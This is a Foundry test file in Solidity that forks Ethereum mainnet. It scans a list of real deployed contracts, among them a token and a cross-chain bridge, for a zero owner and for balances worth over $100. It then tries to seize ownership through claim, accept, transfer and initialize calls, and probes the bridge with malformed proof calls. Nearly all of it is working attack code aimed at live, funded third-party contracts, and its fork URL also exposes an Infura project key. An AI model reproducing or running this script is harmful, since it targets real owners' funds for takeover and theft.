// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IOwnable {
    function owner() external view returns (address);
    function transferOwnership(address) external;
    function renounceOwnership() external;
}

interface IClaimable {
    function claimOwnership() external;
    function acceptOwnership() external;
    function pendingOwner() external view returns (address);
}

contract ZeroOwnerExploit is Test {
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function testExploitZeroOwnerContract() public {
        console.log("=======================================================");
        console.log("TESTING ZERO OWNER EXPLOITS");
        console.log("=======================================================");

        // Contract from scan with zero owner + claimOwnership
        address target = 0x68930887e1318eF30653a4b7942AB07544ebEd4d;

        console.log("Target:", target);

        // Check current owner
        address owner;
        try IOwnable(target).owner() returns (address o) {
            owner = o;
            console.log("Current owner:", owner);
        } catch {
            console.log("No owner function");
            return;
        }

        if (owner != address(0)) {
            console.log("Owner is not zero - skipping");
            return;
        }

        console.log("*** ZERO OWNER CONFIRMED ***");

        // Check balances
        uint256 ethBal = target.balance;
        uint256 wethBal = IERC20(WETH).balanceOf(target);
        uint256 usdcBal = IERC20(USDC).balanceOf(target);

        console.log("ETH balance:", ethBal);
        console.log("WETH balance:", wethBal);
        console.log("USDC balance:", usdcBal);

        // Try to claim ownership
        console.log("\n--- Attempting to claim ownership ---");

        try IClaimable(target).claimOwnership() {
            console.log("*** CLAIMED OWNERSHIP ***");

            // Verify we are now owner
            try IOwnable(target).owner() returns (address newOwner) {
                console.log("New owner:", newOwner);
                if (newOwner == address(this)) {
                    console.log("*** WE ARE NOW THE OWNER ***");
                }
            } catch {}
        } catch {
            console.log("claimOwnership() failed");
        }

        try IClaimable(target).acceptOwnership() {
            console.log("*** ACCEPTED OWNERSHIP ***");
        } catch {
            console.log("acceptOwnership() failed");
        }
    }

    function testScanForExploitableTargets() public {
        console.log("=======================================================");
        console.log("SCANNING FOR EXPLOITABLE ZERO OWNER CONTRACTS");
        console.log("=======================================================");

        // Contracts with zero owner found in scan
        address[10] memory zeroOwnerContracts = [
            0x68930887e1318eF30653a4b7942AB07544ebEd4d,
            0x7Cd01D5CaD4BA0CaEbA02583a5C61d35B23E08eB,
            0xF6374AEfb1e69a21ee516ea4B803b2eA96d06f29,
            0xA18Ab4Fa9a44A72c58e64bfB33D425Ec48475a9f,
            0x32fD8E43114Fb0a292Ca3127EAF4D1D69739Fb83,
            0x6982508145454Ce325dDbE47a25d4ec3d2311933,  // PEPE
            0x71518580f36FeCEFfE0721F06bA4703218cD7F63,  // Verus Bridge
            address(0),
            address(0),
            address(0)
        ];

        for (uint i = 0; i < zeroOwnerContracts.length; i++) {
            address target = zeroOwnerContracts[i];
            if (target == address(0)) continue;

            console.log("\n=== Target:", target, "===");

            // Check owner
            try IOwnable(target).owner() returns (address owner) {
                if (owner != address(0)) {
                    console.log("Owner not zero:", owner);
                    continue;
                }
            } catch {
                console.log("No owner function");
                continue;
            }

            // Get balances
            uint256 ethBal = target.balance;
            uint256 wethBal = IERC20(WETH).balanceOf(target);
            uint256 usdcBal = IERC20(USDC).balanceOf(target);

            uint256 totalValueWei = ethBal + wethBal;
            uint256 totalValueUSD = (totalValueWei * 3300 / 1e18) + (usdcBal / 1e6);

            console.log("ETH:", ethBal / 1e18);
            console.log("WETH:", wethBal / 1e18);
            console.log("USDC:", usdcBal / 1e6);
            console.log("Total Value ~$", totalValueUSD);

            if (totalValueUSD < 100) {
                console.log("Value too low, skipping");
                continue;
            }

            console.log("*** HIGH VALUE TARGET ***");

            // Try various claim methods
            _tryClaimOwnership(target);
        }
    }

    function _tryClaimOwnership(address target) internal {
        // Method 1: claimOwnership()
        try IClaimable(target).claimOwnership() {
            console.log("*** claimOwnership() SUCCEEDED ***");
            return;
        } catch {}

        // Method 2: acceptOwnership()
        try IClaimable(target).acceptOwnership() {
            console.log("*** acceptOwnership() SUCCEEDED ***");
            return;
        } catch {}

        // Method 3: transferOwnership with zero address might transfer to us
        try IOwnable(target).transferOwnership(address(this)) {
            console.log("*** transferOwnership() SUCCEEDED ***");
            return;
        } catch {}

        // Method 4: Check for initialize
        (bool success,) = target.call(abi.encodeWithSignature("initialize()"));
        if (success) {
            console.log("*** initialize() SUCCEEDED ***");
            return;
        }

        // Method 5: Check for init(address)
        (success,) = target.call(abi.encodeWithSignature("initialize(address)", address(this)));
        if (success) {
            console.log("*** initialize(address) SUCCEEDED ***");
            return;
        }

        console.log("No claim method succeeded");
    }

    function testBridgeExploit() public {
        console.log("=======================================================");
        console.log("TESTING VERUS BRIDGE EXPLOIT");
        console.log("=======================================================");

        address bridge = 0x71518580f36FeCEFfE0721F06bA4703218cD7F63;

        console.log("Bridge:", bridge);
        console.log("ETH Balance:", bridge.balance / 1e18, "ETH");
        console.log("USDC Balance:", IERC20(USDC).balanceOf(bridge) / 1e6, "USDC");

        // Check owner
        try IOwnable(bridge).owner() returns (address owner) {
            console.log("Owner:", owner);
        } catch {}

        // Try various exploits
        console.log("\n--- Attempting exploits ---");

        // Try to call import with empty data
        (bool success, bytes memory data) = bridge.call(
            abi.encodeWithSignature("submitImportProof(bytes)", "")
        );
        console.log("submitImportProof result:", success);

        // Try to call export
        (success,) = bridge.call(
            abi.encodeWithSignature("launchExport()")
        );
        console.log("launchExport result:", success);

        // Try revokeWithMultiSig (selector 0x4dc7ca63)
        (success,) = bridge.call(
            abi.encodeWithSelector(bytes4(0x4dc7ca63), "")
        );
        console.log("revokeWithMultiSig result:", success);
    }
}
